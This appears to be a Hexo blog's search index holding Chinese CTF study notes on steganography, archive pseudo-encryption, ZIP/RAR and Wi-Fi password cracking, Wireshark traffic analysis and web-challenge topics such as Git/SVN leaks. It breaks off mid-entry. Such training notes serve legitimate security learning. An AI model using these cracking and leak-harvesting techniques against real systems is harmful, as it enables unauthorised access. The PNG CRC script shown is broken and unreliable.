<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow</title>
      <link href="/2023/04/19/ctfshow/"/>
      <url>/2023/04/19/ctfshow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#愚人节杯">愚人节杯</a><ul><li><a href="#web">WEB</a><ul><li><a href="#easy_signin">easy_signin</a></li></ul></li></ul></li><li><a href="#web-1">WEB</a></li></ul><!-- tocstop --><h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p><p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p><p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230419181149917.png" alt="image-20230419181149917"></p><h1><span id="web">WEB</span></h1>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj</title>
      <link href="/2023/04/18/Buuoj/"/>
      <url>/2023/04/18/Buuoj/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#misc">MISC</a><ul><li><a href="#金三胖">金三胖</a></li><li><a href="#二维码">二维码</a></li></ul></li></ul><!-- tocstop --><h1><span id="misc">MISC</span></h1><h2><span id="金三胖">金三胖</span></h2><ul><li><p>工具：stegsolve</p></li><li><p>使用方法：使用 Analyse–&gt; frame browser查看</p></li></ul><h2><span id="二维码">二维码</span></h2><ul><li>工具：binwalk</li><li>使用方法 <code>binwalk -e qr.png</code>分离出两张图</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-b站笔记</title>
      <link href="/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#b站网安课程">B站网安课程</a></li><li><a href="#misc">Misc</a><ul><li><a href="#文件操作与隐写">文件操作与隐写</a><ul><li><a href="#文件类型识别">文件类型识别</a></li><li><a href="#文件分离操作">文件分离操作</a></li><li><a href="#文件合并操作">文件合并操作</a></li></ul></li><li><a href="#图片隐写">图片隐写</a><ul><li><a href="#图片加密">图片加密</a></li></ul></li><li><a href="#压缩文件处理">压缩文件处理</a><ul><li><a href="#判断什么加密方式">判断什么加密方式</a></li></ul></li><li><a href="#流量分析">流量分析</a></li></ul></li><li><a href="#crypto">Crypto</a></li></ul><!-- tocstop --><h1><span id="b站网安课程">B站网安课程</span></h1><p><a href="https://www.processon.com/view/link/62b1b2267d9c08073c671315" target="_blank" rel="noopener">学习路线图</a></p><h1><span id="misc">Misc</span></h1><h2><span id="文件操作与隐写">文件操作与隐写</span></h2><h3><span id="文件类型识别">文件类型识别</span></h3><ol><li>file命令<ul><li>使用场景：不知道后缀，无法打开文件</li></ul></li><li>winhex<ul><li>使用场景：windows下通过文件头信息判断文件类型</li></ul></li></ol><ul><li>遇到题目给个.png文件，但是打不开，通过<code>file</code>命令识别发现是data的情况，需要修复。<ul><li>通过010 Editor在文件加上对应头部就行。</li></ul></li></ul><ol start="3"><li><p>010 Editor</p><p>遇到都是16进制编码的文本，可以通过import hex导入。</p></li></ol><h3><span id="文件分离操作">文件分离操作</span></h3><ol><li><p>Binwalk工具</p><p>用法：</p><p>分析文件: binwalk filename</p><p>分离文件: binwalk -e filename</p></li><li><p>formost</p><ul><li>如果Binwalk没办法分离，可以使用它</li></ul><p>用法：</p><p>Foremost filename -o dir</p></li><li><p>dd</p><ul><li>如果是分块的话，前两个工具都不管用，就使用它把。</li></ul><p>用法：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span> =<span class="number">1</span>.txt of=<span class="number">4</span>.txt bs=<span class="number">5</span> count=<span class="number">3</span> skip=<span class="number">1</span></span><br><span class="line"># inputfile outputfile blocksize</span><br></pre></td></tr></table></figure><p>如果我们不知道文件分成几块合适的话，需要借助binwalk分析</p></li></ol><h3><span id="文件合并操作">文件合并操作</span></h3><ol><li><p>Linux下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat a b c ... &gt; dist</span><br><span class="line"><span class="meta">#</span><span class="bash"> 完整性检查</span></span><br><span class="line">md5sum filename</span><br></pre></td></tr></table></figure></li><li><p>Windows下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> /B a+b+c dist</span><br><span class="line"># 如果前缀一样</span><br><span class="line"><span class="built_in">copy</span> /B prefix* dist</span><br><span class="line"># 完整校验</span><br><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure></li></ol><h2><span id="图片隐写">图片隐写</span></h2><ol><li><p>细微颜色区别</p></li><li><p>GIF图多帧隐藏</p><ol><li>颜色通道隐藏</li><li>不同帧图信息隐藏</li><li>不同帧对比隐写</li></ol></li><li><p>Exif信息隐藏</p><p>通过属性可以看到信息</p></li><li><p>图片修复</p><ol><li>图片头修复</li><li>图片尾修复</li><li>CRC校验修复</li><li>长、宽、高修复</li></ol></li><li><p>最低有效位LSB隐写</p></li><li><p>图片加密</p><ol><li>Stegdetect</li><li>outguess</li><li>Jphide</li><li>F5</li></ol></li></ol><ul><li><p><strong>Firework</strong>：</p><blockquote><p>使用010 Editor打开文件时会看到文件头包含firework标识，通过firework可以找到隐藏图片。</p></blockquote></li><li><p><strong>Stegsolve</strong>:</p><blockquote><p>两张图片之间做运算<em>XOR/SUB/ADD</em></p><p>可以组合猜测LSB，但是每次都需要手动点击</p></blockquote></li><li><p><strong>Zsteg</strong>:</p><blockquote><p>直接排列组合所有LSB结果</p></blockquote></li><li><p><strong>wbstego4</strong>:</p><blockquote><p>可以解密.bmp/pdf文件，需要先转bmp</p></blockquote></li><li><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">  im = PIL.Image.open(<span class="string">'01.bmp'</span>)</span><br><span class="line">  im2 = im.copy()</span><br><span class="line">  pix = im2.load()</span><br><span class="line">  wid,hei = im2.size</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,wid):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>,hei):</span><br><span class="line">      <span class="keyword">if</span> pix[x,y]&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">        pix[x,y]=<span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        pix[x,y]=<span class="number">255</span></span><br><span class="line"> im2.show()</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p><strong>TweakPNG</strong>：</p><ul><li>​    CRC错误</li></ul><blockquote><p>它可以修改和查看一些PNG图像文件的元信息存储，我们需要通过该软件修改，搜索软件提示错误值的crc值替换成正确的即可。</p></blockquote><ul><li>图片宽高错误</li></ul><blockquote><p>需要通过CRC计算出正确的宽高</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc_current = <span class="string">'0x08ec7edb'</span> <span class="comment"># 目前的就行，不是提示的正确的</span></span><br><span class="line">crcbp = open(<span class="string">'xxx.png'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+struct.pack(<span class="string">'&gt;i'</span>)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == crc_current:</span><br><span class="line">      print(i,j)</span><br><span class="line">      print(hex(i),hex(j))</span><br></pre></td></tr></table></figure></li></ul><h3><span id="图片加密">图片加密</span></h3><ul><li><p>Bftools</p><blockquote><p>在win下用于对加密过的图片进行解密操作</p></blockquote></li><li><p>SilentEye</p><blockquote><p>可以将文字文件隐藏到图片，或者对图片进行解密的工具</p></blockquote></li><li><p>Stegdetect</p><blockquote><p>主要用于检测图片使用哪些隐写工具隐藏信息</p></blockquote></li><li><p>Jphide</p><blockquote><p>基于最低有效位LSB的图像隐写算法 </p></blockquote></li><li><p>Outguess</p><blockquote><p>图像隐写算法 </p></blockquote></li><li><p>F5</p><blockquote><p>图像隐写算法 </p></blockquote></li><li><p>CQR</p><blockquote><p>二维码处理</p></blockquote></li></ul><p><strong>二维码处理：</strong></p><ol><li>补全，可能二维码的方块被挡住了，我们需要讲起补全即可</li><li>取反：使用画图工具的反色 功能<ul><li>如果是彩色图片可以用<strong>Stegsolve</strong>查看颜色通道进行扫码，如果还没办法扫出来可以先反色再扫。</li></ul></li></ol><h2><span id="压缩文件处理">压缩文件处理</span></h2><h3><span id="判断什么加密方式">判断什么加密方式</span></h3><p><strong>伪加密：</strong></p><blockquote><p>压缩源文件数据区的<strong>全局方式位标记</strong>应当为 00 00 （50 4B 03 04 14 00 后）<br>且压缩源文件目录区的<strong>全局方式位标记</strong>应当为 09 00  （50 4B 01 02 14 00 后）</p></blockquote><p> <strong>真加密：</strong></p><blockquote><p>压缩源文件数据区的<strong>全局方式位标记</strong>应当为09 00 （50 4B 03 04 14 00 后） </p><p>且压缩源文件目录区的<strong>全局方式位标记</strong>应当为09 00 （50 4B 01 02 14 00 后） </p></blockquote><ol><li><p>伪加密</p><p><strong>使用场景：</strong> 伪加密文件</p></li></ol><p><strong>操作方法：</strong>使用winhex打开压缩文件，找到文件头第九第十个字符，将其修改为0000</p><p>   1.使用winhex打开文件搜索16进制504B0102，可以看到每个加密文件的文件头字段。</p><p>   <font color="orange"><strong>RAR文件</strong></font>由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失目正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><ol start="2"><li><p>暴力破解</p><p>通常我们可以使用ARCHPR.exe工具来破解rar文件，用Ziperello来破解zip</p><p><strong>使用场景：</strong>windows下加密过的zip文件</p><ol><li><p>攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型开始于和结束于选项具体范围，如果没有定义则全范围暴力破解。点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统 自带的英文字典作为密码字典。</p></li><li><p>攻击类型选择掩码可以进行复杂的暴力破解比如知道密码前3位是abc，后3位为数字，则在攻击类型选择掩码，在掩码处输入acb???，暴力范围选项选择所有数字，打开要破解的点击，点击破解。此时?? ?的部分会被我们选择的暴力破解范围中的字符代替。</p></li><li><p>有时不一定能破解出文件口令，但是能够找到加密密钥等信息，可以直接将文件解密，点击确定保存解密后的文件</p></li></ol><p>使用该方法需要注意两个关键点:<br>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。<br>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p></li><li><p>文件分析</p><p>有时候给的RAR文件头部各个字块会故意给错导致无法识别（隐藏文件）</p><table><thead><tr><th>字段</th><th>大小</th><th>作用</th></tr></thead><tbody><tr><td>HEAD CRC</td><td>2 字节</td><td>所有块或块部分的CRC</td></tr><tr><td>HEAD TYPE</td><td>1 字节</td><td>块类型</td></tr><tr><td>HEAD FLAGS</td><td>2 字节</td><td>块标记</td></tr><tr><td>HEAD SIZE</td><td>2 字节</td><td>块大小 #如果块标记的第一位被置1的话，还存在</td></tr><tr><td>ADD SIZE</td><td>4 字节</td><td>可选结构 - 增加块大小</td></tr></tbody></table><p>那么，文件块的<strong>第3个字节为块类型，也叫头类型</strong></p><p> 头类型是0x72表示是标记块</p><p>头类型是0x73表示是压缩文件头块</p><p>头类型是0x74表示是<strong>文件头</strong>块</p><p>头类型是0x75表示是注释头</p></li></ol><h2><span id="流量分析">流量分析</span></h2><blockquote><p>CTF 比赛中，流量包的取证分析是另一项重要的考察方向。<br>通常比赛中会提供一个包含流量数据的PCAP 文件，有时候也会需要选手们先进行修复或重构传输文件后，再进行分析。</p></blockquote><ul><li><p>总体把握</p><ul><li>协议分级</li><li>端点统计</li></ul></li><li><p>过滤筛选</p><ul><li>过滤语法</li><li>Host，Protocol，contains，特征值</li></ul></li><li><p>发现异常</p><ul><li>特殊字符串</li><li>协议某字段</li><li>flag 位于服务器中</li></ul></li><li><p>数据提取</p><ul><li>字符串取</li><li>文件提取</li></ul></li><li><p><strong>总的来说比赛中的流量分析可以概括为以下三个方向:</strong></p><ul><li>流量包修复</li><li>协议分析</li><li>数据提取</li></ul></li></ul><p>常用的过滤命令：</p><ol><li><p>过滤IP，如源IP或者目标</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure></li><li><p>过滤端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line">tcp.dstport == 80 <span class="comment"># 只显示tcp目标地址80端口</span></span><br><span class="line">tcp.srcport == 80 <span class="comment"># 只显示tcp目标地址80端口</span></span><br><span class="line">tcp.port &gt;=1 and tcp.port &lt;=80</span><br></pre></td></tr></table></figure></li><li><p>过滤协议</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp/udp/arp/icmp/http/ftp/dns/ip...</span><br></pre></td></tr></table></figure></li><li><p>过滤MAC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst == xx:xx:...</span><br></pre></td></tr></table></figure></li><li><p>包长度过滤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length == 26 <span class="comment"># 这个长度是指udp本身固定长度8加上udp下面那块数据包之和</span></span><br><span class="line">tcp.len &gt;=7 <span class="comment">#指的是ip数据包（tcp下面那块数据），不包括tcp本身</span></span><br><span class="line">ip.len == 94 <span class="comment">#除了以太网头固定长度14，其他都算ip.len，即从ip本身到最后</span></span><br><span class="line">frame.len == 119 <span class="comment">#整个数据包长度，从eth开始到最后</span></span><br></pre></td></tr></table></figure></li><li><p>http模式过滤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http.request.method ==<span class="string">"GET"</span></span><br><span class="line">http.request.method ==<span class="string">"POST"</span></span><br><span class="line">http.request.uri == <span class="string">"/img/logo-edu.gif"</span></span><br><span class="line">http contains <span class="string">"GET"</span></span><br><span class="line">http contains <span class="string">"HTTP/1."</span></span><br><span class="line">http.request.method == <span class="string">"GET"</span> &amp;&amp; http contains <span class="string">"User-Agent:"</span></span><br><span class="line">http contains <span class="string">"flag"</span></span><br><span class="line">http contains <span class="string">"key"</span></span><br><span class="line">tcp contains <span class="string">"flag"</span></span><br></pre></td></tr></table></figure></li><li><p>协议分析</p><blockquote><p>Statistics-&gt;Protocal Hierarchy</p><p>Apply as filter-&gt;selected</p></blockquote></li><li><p>流汇聚</p><blockquote><p>选中一条后，追踪流</p></blockquote><ul><li>HTML中直接包含重要信息</li><li>上传或者下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传</li><li>一句话木马，POST请求，内容包含eval，使用base64加密</li></ul></li><li><p>数据提取</p><p>自动提取</p><blockquote><p>文件-&gt;导出对象-》http</p></blockquote><p>手动提取内容</p><blockquote><p>点击想要的数据包，选定media type的位置</p><p>右键-&gt;导出分组字节流</p><p>文件-&gt;出分组字节流</p><p>选择保存二进制</p></blockquote></li><li><p>无线wifi流量包</p><ol><li>用aircrack-ng检查cap包：<code>aircrack-ng xxx.cap</code></li><li>跑字典<code>aircarck-ng xxx.cap -w pass.txt</code></li></ol></li><li><p>USB流量</p><ol><li><p>键盘</p><blockquote><p>可以将该域的值在主面板上显示，键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usbpacket .</p></blockquote><p>a. 第一种方法：导出分组解析结果-&gt;为csv</p></li></ol><p>​       b. 第二种方法：使用ws提供的命令行工具，apply as column 然后tshark</p><p>​                  <code>tshark -r usb1.pap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>​      c. 用脚本去分析</p><ol start="2"><li><p>鼠标</p><blockquote><p>鼠标流量与键盘流量不同，鼠标移动时表现为连续性，与键盘的离散性不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。</p><p>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键;为0x01时，代表按左键，为0x02时，代表当前按键为右键。</p><p>第二个字节代表左右偏移;当值为正时，代表右移多少像素。当值为负时，代表左移多少像素。<br>同理，第三个字节代表上下偏移。</p></blockquote><p>用脚本去画出鼠标的图</p></li></ol></li><li><p>HTTPS流量包文件分析</p><blockquote><p>Preferences-&gt;Protocols-&gt;SSL-&gt;Edit RSA keys list</p></blockquote></li></ol><h1><span id="crypto">Crypto</span></h1><p><a href="http://www.hiencode.com/" target="_blank" rel="noopener">解码工具网站</a></p><ul><li><p>编码：</p><ul><li>ASCII</li><li>BASE64：<ul><li>特征：文本末尾出现1到2个<strong>==</strong></li></ul></li><li>URL：<ul><li>就是一个字符的ascii码的十六进制，需要在前面加%。</li><li>特征：%</li></ul></li><li>Unicode<ul><li>特征：\uxx</li></ul></li><li>js<ul><li>使用浏览器输入eval()</li></ul></li></ul></li><li><p>加密</p><ul><li>对称加密<ul><li>DES</li><li>AES</li></ul></li><li>非对称加密<ul><li>RSA</li><li>ECA</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub入门笔记</title>
      <link href="/2023/03/29/ctf/"/>
      <url>/2023/03/29/ctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>收集和记录一下CTF入门的write up</p><a id="more"></a><!-- toc --><ul><li><a href="#网站">网站</a></li><li><a href="#工具">工具</a></li><li><a href="#web">Web</a><ul><li><a href="#前置技能">前置技能</a><ul><li><a href="#请求方式">请求方式</a></li><li><a href="#302跳转">302跳转</a></li><li><a href="#cookie">Cookie</a></li><li><a href="#基础认证">基础认证</a></li><li><a href="#响应包源代码">响应包源代码</a></li></ul></li><li><a href="#信息泄露">信息泄露</a><ul><li><a href="#目录遍历">目录遍历</a></li><li><a href="#phpinfo">phpinfo</a></li><li><a href="#hg泄露">hg泄露</a></li><li><a href="#svn泄露">SVN泄露</a></li><li><a href="#git泄露">Git泄露</a><ul><li><a href="#log">log</a></li><li><a href="#stash">Stash</a></li><li><a href="#index">index</a></li></ul></li><li><a href="#备份文件下载">备份文件下载</a><ul><li><a href="#网站源码">网站源码</a></li><li><a href="#bak文件">bak文件</a></li><li><a href="#vim缓存">vim缓存</a></li><li><a href="#ds_store">DS_Store</a></li></ul></li><li><a href="#字符型">字符型</a></li><li><a href="#报错注入">报错注入</a></li><li><a href="#布尔注入">布尔注入</a></li><li><a href="#mysql结构">MySQL结构</a></li><li><a href="#时间盲注">时间盲注</a></li><li><a href="#cookie注入">cookie注入</a></li><li><a href="#ua注入">UA注入</a></li><li><a href="#referer注入">Referer注入</a></li><li><a href="#过滤空格">过滤空格</a></li></ul></li><li><a href="#文件上传">文件上传</a><ul><li><a href="#无验证">无验证</a></li><li><a href="#前端验证">前端验证</a></li><li><a href="#htaccess">.htaccess</a></li><li><a href="#mime">MIME</a></li><li><a href="#文件头检查">文件头检查</a></li><li><a href="#00截断">00截断</a></li><li><a href="#双写后缀">双写后缀</a></li></ul></li><li><a href="#rce">RCE</a><ul><li><a href="#eval执行">eval执行</a></li><li><a href="#文件包含">文件包含</a></li><li><a href="#phpinput">php://input</a></li><li><a href="#读取源代码">读取源代码</a></li><li><a href="#远程包含">远程包含</a></li><li><a href="#命令注入">命令注入</a></li><li><a href="#过滤cat">过滤cat</a></li><li><a href="#过滤空格-1">过滤空格</a></li><li><a href="#过滤目录分割符">过滤目录分割符</a></li><li><a href="#过滤运算符">过滤运算符</a></li><li><a href="#综合练习">综合练习</a></li></ul></li><li><a href="#ssrf">SSRF</a><ul><li><a href="#内网访问">内网访问</a></li><li><a href="#伪协议读取文件">伪协议读取文件</a></li><li><a href="#端口扫描">端口扫描</a></li><li><a href="#post请求">POST请求</a></li><li><a href="#上传文件">上传文件</a></li><li><a href="#redis协议">Redis协议</a></li><li><a href="#url-bypass">URL Bypass</a></li><li><a href="#数字ip-bypass">数字IP Bypass</a></li><li><a href="#302跳转-1">302跳转</a></li><li><a href="#dns重绑定-bypass">DNS重绑定 Bypass</a></li></ul></li></ul></li><li><a href="#reverse">Reverse</a></li><li><a href="#crypto">Crypto</a></li><li><a href="#misc">Misc</a><ul><li><a href="#流量分析">流量分析</a><ul><li><a href="#mysql流量">Mysql流量</a></li><li><a href="#redis流量">Redis流量</a></li><li><a href="#mongodb">MongoDB</a></li><li><a href="#icmp-data">ICMP Data</a></li><li><a href="#icmp-length">ICMP Length</a></li><li><a href="#icmp-lengthbin">ICMP LengthBin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="网站">网站</span></h1><ul><li>刷题<ul><li><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">CTFHUB</a> 对新人极其友好，可以快速入门CTF</li><li><a href="https://buuoj.cn/login?next=%2Fchallenges%3F" target="_blank" rel="noopener">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li><li><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></li></ul></li><li>搜索引擎<ul><li><a href="https://fofa.info/" target="_blank" rel="noopener">https://fofa.info/</a></li><li><a href="https://quake.360.net/quake/#/index" target="_blank" rel="noopener">https://quake.360.net/quake/#/index</a></li></ul></li></ul><h1><span id="工具">工具</span></h1><ul><li><p>BurpSuite</p><blockquote><p>​    Burp Suite是一个功能强大的集成渗透测试工具，旨在帮助安全测试人员执行各种 Web 应用程序安全测试。它提供了多个模块，包括代理、扫描器、爬虫、反射器、拦截器、重放器等功能，可协助测试人员发现应用程序中的漏洞，如SQL注入、跨站点脚本（XSS）、身份验证和会话问题、CSRF、文件包含漏洞等。</p></blockquote></li><li><p>WiresShark</p><blockquote><p>Wireshark是一款网络协议分析工具，可以帮助用户捕获和分析网络数据包。它能够实时抓取和展示网络上所有传输的数据，并提供多种过滤机制和统计图表，能够深入了解网络通信的细节，发现网络通信中可能存在的问题。</p></blockquote></li><li><p>fscan</p><blockquote><p>fscan是一款基于Python的网络渗透测试工具，它可以用于目标发现、端口扫描、漏洞检测等方面。fscan能够快速扫描大量IP地址和端口，并提供了多种扫描方式和过滤规则，例如TCP和UDP端口扫描、服务识别、OS指纹识别等。</p></blockquote></li><li><p>GitHack</p><blockquote><p>GitHack指的是一种基于Git版本控制系统的攻击技术。攻击者可以使用GitHack来获取敏感信息或执行未经授权的操作。攻击者通常会在Git上查找敏感信息，例如密码或私钥，并利用这些信息进一步入侵目标系统。</p></blockquote></li><li><p>dvcs-ripper</p><blockquote><p>可以支持svn、hg等文件下载</p></blockquote></li><li><p>PostMan</p><blockquote><p>Postman是一个<a href="https://baike.baidu.com/item/接口测试/1917757?fromModule=lemma_inlink" target="_blank" rel="noopener">接口测试</a>工具,在做接口测试的时候,Postman相当于一个客户端,它可以模拟用户发起的各类<a href="https://baike.baidu.com/item/HTTP请求/10882159?fromModule=lemma_inlink" target="_blank" rel="noopener">HTTP请求</a>,将请求<a href="https://baike.baidu.com/item/数据发送/22124759?fromModule=lemma_inlink" target="_blank" rel="noopener">数据发送</a>至<a href="https://baike.baidu.com/item/服务端/6492316?fromModule=lemma_inlink" target="_blank" rel="noopener">服务端</a>,获取对应的响应结果, 从而验证响应中的结果数据是否和预期值相匹配;并确保开发人员能够及时处理接口中的<a href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink" target="_blank" rel="noopener">bug</a>,进而保证产品上线之后的稳定性和安全性</p></blockquote></li></ul><h1><span id="web">Web</span></h1><h3><span id="前置技能">前置技能</span></h3><h4><span id="请求方式">请求方式</span></h4><ul><li>思路：使用PostMan，修改请求方式为CTFHUB</li></ul><h4><span id="302跳转">302跳转</span></h4><p>使用浏览器访问index.php时，发现F12中network有302</p><ul><li>思路：使用curl访问index.php即可，因为curl不支持302跳转</li></ul><h4><span id="cookie">Cookie</span></h4><p><a href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp" target="_blank" rel="noopener">参考</a>，使用<code>burpsuite</code>的<code>repeater</code>功能</p><h4><span id="基础认证">基础认证</span></h4><p><a href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj" target="_blank" rel="noopener">参考</a>，使用<code>burpsuite</code>的<code>Intruder</code>功能</p><h4><span id="响应包源代码">响应包源代码</span></h4><p>使用F12直接在前端源代码里面查看</p><h3><span id="信息泄露">信息泄露</span></h3><h4><span id="目录遍历">目录遍历</span></h4><p>由于配置错误导致网站的目录可被遍历。</p><ul><li>思路：我们遍历网站即可找到结果</li></ul><h4><span id="phpinfo">phpinfo</span></h4><p>phpinfo()是php中查看相关信息的函数，当在页面中执行<code>phpinfo()</code>函数时，php会将自身的所有信息全部打印出来。在<code>phpinfo</code>中会泄露很多服务端的一些信息</p><ul><li>思路：flag暴露在phpinfo中</li></ul><h4><span id="hg泄露">hg泄露</span></h4><ul><li>思路：使用dirsearch发现有.hg文件夹，使用dvcs-ripper下载目录，但是工具没有将所有文件下下来，使用<code>tree</code>命令来查看目录，分析发现txt文件中有<code>add flag</code>，使用<code>grep -a -r flag</code>查看flag存在的文件名，通过curl来查看文件。</li></ul><h4><span id="svn泄露">SVN泄露</span></h4><ul><li>思路：使用dirsearch发现有.svn文件夹，使用dvcs-ripper下载目录，从 wc.db 中找到 flag 的文件的文件名, 尝试访问结果发现被删除了。查看<code>.svn/pristine/</code>中的文件，找到flag</li></ul><h4><span id="git泄露">Git泄露</span></h4><ul><li>思路：使用dirsearch发现有.git文件夹，使用githack工具将网站里的.git文件夹下载到本地</li></ul><h5><span id="log">log</span></h5><p>网站下可能有.git文件</p><ul><li>思路：我们通过<code>git log</code>查看提交日志，然后用过<code>git diff</code>来对比版本区别找到flag</li></ul><h5><span id="stash">Stash</span></h5><p>git可能有的文件放到stash暂存</p><ul><li>思路：通过<code>git stash list</code>查看，执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</li></ul><h5><span id="index">index</span></h5><p>使用<code>git ls-file --stage</code>查看index file文件，使用<code>git 